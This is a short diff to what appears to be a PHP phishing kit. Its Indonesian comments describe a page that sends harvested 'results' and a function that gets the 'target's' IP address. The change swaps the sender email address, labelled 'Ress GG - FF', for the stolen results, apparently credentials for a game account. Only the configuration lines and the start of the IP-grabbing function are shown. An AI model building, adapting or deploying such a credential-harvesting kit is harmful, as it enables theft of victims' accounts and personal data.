@@ -9,7 +9,7 @@ $jamasuk = date('l, d-m-Y h:i:s');
 
 // KONTROL UNTUK HALAMAN KIRIM RESULT
 $author = 'ITS ME ARPANTEK';
-$sender = 'From: Ress GG - FF <yumekodeveloper@gmail.com>';
+$sender = 'From: Ress GG - FF <udinkangunchek@gmail.com>';
 
 // MENDAPATKAN ALAMAT IP PRIBADI SI TARGET
 function getClientIP() {
